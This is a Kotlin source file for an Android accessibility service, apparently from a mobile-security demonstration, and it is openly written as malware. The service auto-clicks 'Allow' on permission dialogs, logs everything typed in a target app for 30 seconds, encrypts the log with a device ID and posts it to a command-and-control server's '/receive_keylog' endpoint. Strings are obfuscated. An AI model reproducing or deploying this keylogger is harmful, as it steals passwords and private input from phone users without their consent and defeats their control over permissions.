package com.mobilesec.govcomm.mal

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import io.github.c0nnor263.obfustringcore.ObfustringThis
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.UUID


@ObfustringThis
class GovcommAccessibilityService: AccessibilityService(){

    private var isLoggingEnabled = false
    private var logBuilder = StringBuilder()
    private val coroutineScope = CoroutineScope(Dispatchers.Main)

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("Malicious Activity", "on Service Connected!")
        requestSensitivePermission()
    }

    private fun requestSensitivePermission() {
        val intent = Intent(this, PermissionRequestActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        //Log.d("MaliciousAccessibility", "Requested sensitive permissions")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let { ev ->
            // Handle button detection and clicking "Allow"
            if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                //Log.d("Testing", "Button Detected!")
                // Added more button texts for flexibility
                val buttonTexts = listOf("Allow", "While using the app")
                buttonTexts.forEach { buttonText ->
                    findAndClickButton(rootInActiveWindow, buttonText)
                }
            }

            // Start logging when the app launches
            if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && ev.packageName.toString() == "TARGET_APP_PACKAGE_NAME") {
                //Log.d("TargetAppLaunch", "Target app launched")
                startLogging(ev.packageName.toString())
            }

            // Log keystrokes if logging is enabled
            if (ev.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && isLoggingEnabled) {
                val typedText = ev.text.toString()
                logKeyStrokes(typedText)
            }
        }
    }

    fun getInstallationId(): String {
        val sharedPref = this.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return sharedPref.getString("installationId", null) ?: UUID.randomUUID().toString().also { installationId ->
            sharedPref.edit().putString("installationId", installationId).apply()
        }
    }


    private fun startLogging(pkgName: String) {
        if (!isLoggingEnabled) {
            isLoggingEnabled = true
            logBuilder = StringBuilder() // Reset the log builder

            val uuid = getInstallationId()

            coroutineScope.launch {
                delay(30000) // Log for 30 seconds
                isLoggingEnabled = false

                val loggedDataWithMetadata = "$pkgName, $uuid, ${logBuilder.toString()}"
                //Log.d("KeyLogger", "Logging finished. Data: $loggedDataWithMetadata")

                // Post the logged data with package name and UUID
                postLoggedData(loggedDataWithMetadata)
            }
        }
    }

    private suspend fun postLoggedData(loggedData: String) {
        // First, encrypt and Base64 encode the keylog data
        val encryptedAndEncodedKeylog = AESEncryption.encrypt(loggedData)

        withContext(Dispatchers.IO) {
            val client = OkHttpClient()
            val mediaType = "text/plain; charset=utf-8".toMediaType()
            // Use the encrypted and encoded data as the request body
            val requestBody = encryptedAndEncodedKeylog.toRequestBody(mediaType)
            val request = Request.Builder()
                .url(SecurityUtils.c2ServerUrl + "/receive_keylog")  // Replace with your actual C2 server URL
                .post(requestBody)
                .build()

            try {
                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    //Log.d("Network", "Encrypted data posted successfully")
                } else {
                    //Log.e("Network", "Failed to post encrypted data, Response Code: ${response.code}")
                }
            } catch (e: Exception) {
                //Log.e("Network", "Error posting encrypted data", e)
            }
        }
    }

    private fun logKeyStrokes(typedText: String) {
        logBuilder.append(typedText).append("\n") // Collect keystrokes
        //Log.d("KeyLogger", "User typed: $typedText")
    }

    private fun findAndClickButton(nodeInfo: AccessibilityNodeInfo?, buttonText: String) {
        nodeInfo?.let { node ->
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null && child.className == "android.widget.Button" && child.text == buttonText) {
                    child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                findAndClickButton(child, buttonText)
            }
        }
    }

    override fun onInterrupt() {
        TODO("Not yet implemented")
    }
}